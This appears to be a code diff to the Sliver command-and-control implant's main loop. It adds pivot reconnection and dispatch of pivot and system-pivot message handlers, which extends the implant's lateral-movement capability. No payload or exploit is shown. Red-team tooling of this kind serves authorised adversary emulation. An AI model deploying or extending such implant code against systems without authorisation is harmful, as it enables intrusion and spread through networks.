@@ -42,6 +42,7 @@ import (
 	"github.com/bishopfox/sliver/sliver/limits"
 	"github.com/bishopfox/sliver/sliver/transports"
 	"github.com/bishopfox/sliver/sliver/version"
+	"github.com/bishopfox/sliver/sliver/pivots"
 
 	"github.com/golang/protobuf/proto"
 )
@@ -115,8 +116,13 @@ func mainLoop(connection *transports.Connection) {
 
 	connection.Send <- getRegisterSliver() // Send registration information
 
+	// Reconnect active pivots
+	pivots.ReconnectActivePivots(connection)
+
+	pivotHandlers := handlers.GetPivotHandlers()
 	tunHandlers := handlers.GetTunnelHandlers()
-	sysHandlers := handlers.GetSystemHandlers()
+	sysHandlers := handlers.GetSystemHandlers()	
+	sysPivotHandlers := handlers.GetSystemPivotHandlers()
 	specialHandlers := handlers.GetSpecialHandlers()
 
 	for envelope := range connection.Recv {
@@ -125,6 +131,11 @@ func mainLoop(connection *transports.Connection) {
 			log.Printf("[recv] specialHandler %d", envelope.Type)
 			// {{end}}
 			handler(envelope.Data, connection)
+		} else if handler, ok := pivotHandlers[envelope.Type]; ok {
+			// {{if .Debug}}
+			log.Printf("[recv] pivotHandler with type %d", envelope.Type)
+			// {{end}}
+			go handler(envelope, connection)	
 		} else if handler, ok := sysHandlers[envelope.Type]; ok {
 			// {{if .Debug}}
 			log.Printf("[recv] sysHandler %d", envelope.Type)
@@ -138,6 +149,11 @@ func mainLoop(connection *transports.Connection) {
 		} else if handler, ok := tunHandlers[envelope.Type]; ok {
 			// {{if .Debug}}
 			log.Printf("[recv] tunHandler %d", envelope.Type)
+			// {{end}}
+			go handler(envelope, connection)
+		} else if handler, ok := sysPivotHandlers[envelope.Type]; ok {
+			// {{if .Debug}}
+			log.Printf("[recv] sysPivotHandlers with type %d", envelope.Type)
 			// {{end}}
 			go handler(envelope, connection)
 		} else {
